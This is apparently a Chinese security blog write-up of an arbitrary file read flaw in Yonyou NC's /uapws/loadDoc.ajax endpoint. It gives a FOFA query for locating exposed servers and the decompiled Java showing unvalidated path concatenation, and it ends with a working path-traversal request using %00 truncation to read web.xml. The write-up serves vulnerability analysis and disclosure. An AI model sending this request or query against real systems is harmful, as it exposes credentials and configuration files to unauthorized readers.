# 漏洞简介

[用友](https://mrxn.net/tag/用友) NC 是一种商业级的企业资源规划，为企业提供全面的管理解决方案，包括财务管理、采购管理、销售管理、人力资源管理等功能，基于云原生架构，深度应用新一代数字技术，打造开放、 互联、融合、智能的一体化云平台，支持公有云、混合云、专属云的灵活部署模式。聚焦数字化管理、数字化经营、数字化平台等三大企业数字化转型战略方向，提供涵盖数字营销、智能制造、财务共享、人力共享与协同，智慧采购、数字中台等18大解决方案，助力大型企业全面落地数字化和业务流程优化。用友NC loadDoc 接口处 ws 参数存在[文件读取](https://mrxn.net/tag/文件读取)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/漏洞)读取设备上任意文件内容，造成敏感信息泄露。

# 影响版本

# fofa语法

> ```
> icon_hash="1085941792" || app="用友-UFIDA-NC"
> ```

# 漏洞分析

直接看 `LoadDocAction.java` 里有关 `LoadDocAction` 的实现逻辑

```java
package nc.uap.ws.console.action;

import java.io.IOException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import nc.uap.ws.console.action.IAction;
import nc.uap.ws.console.config.Config;
import nc.uap.ws.console.fault.Fault;
import nc.uap.ws.console.fault.Faults;
import nc.uap.ws.console.helper.DocHelper;

public class LoadDocAction
implements IAction {
    @Override
    public Faults execuse(HttpServletRequest req, HttpServletResponse resp) {
        Faults faults = new Faults();
        String ws = req.getParameter("ws");
        if (ws == null || ws.equals("")) {
            faults.add(new Fault(0, "ws param need to be setted"));
            return faults;
        }
        DocHelper manager = new DocHelper(Config.docDir);
        try {
            String doc = manager.loadDoc(ws);
            resp.setStatus(200);
            resp.getWriter().write(doc);
        }
        catch (IOException e) {
            faults.add(new Fault(80, e.getMessage()));
            return faults;
        }
        return faults;
    }
}
```

可以看到 获取 `ws` 参数，直接带入 `loadDoc` 方法，跟进看其实现

```java
package nc.uap.ws.console.helper;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;

public class DocHelper {
    private String DocDir;

    public DocHelper(String DocDir) {
        this.DocDir = DocDir;
    }

    public String loadDoc(String ws) throws IOException {
        StringBuilder builder = new StringBuilder();
        BufferedReader br = null;
        try {
            String line;
            File file = new File(new File(this.DocDir), ws + ".txt");
            if (!file.exists()) {
                file.createNewFile();
            }
            FileReader fr = new FileReader(file);
            br = new BufferedReader(fr);
            while ((line = br.readLine()) != null) {
                builder.append(line);
            }
        }
        catch (IOException e) {
            throw e;
        }
        finally {
            if (br != null) {
                br.close();
                br = null;
            }
        }
        return builder.toString();
    }
```

用户可控的 `ws` 参数直接拼接文件路径，未对输入进行合法性校验，如果后端java版本低于7，就通过%00截断绕过 txt 后缀限制，从而达到任意文件读取的目的。

关于 Java 中 %00 (NULL byte) 截断漏洞的版本信息如下:

受影响的 Java 版本范围:

- Java 7 以下所有版本(Java SE 7 之前)
- Java 6 所有版本(包括 Java SE 6 所有更新版本)
- Java 5 所有版本
- Java 1.4 及更早版本

不受影响的 Java 版本:

- Java 7 及以上版本(Java SE 7+)已修复了这个问题

其实这个漏洞和之前已经披露的 `saveDoc` 任意文件上传漏洞都在同一个文件里，只不过最近才披露这个 `loadDoc` 任意[文件读取漏洞](https://mrxn.net/tag/文件读取)罢了。

# 

```http
POST /uapws/loadDoc.ajax HTTP/1.1
Host: nc.mrxn.net
Content-Type: application/x-www-form-urlencoded

ws=../../WEB-INF/web.xml%00
```

成功读取到 `web.xml` 文件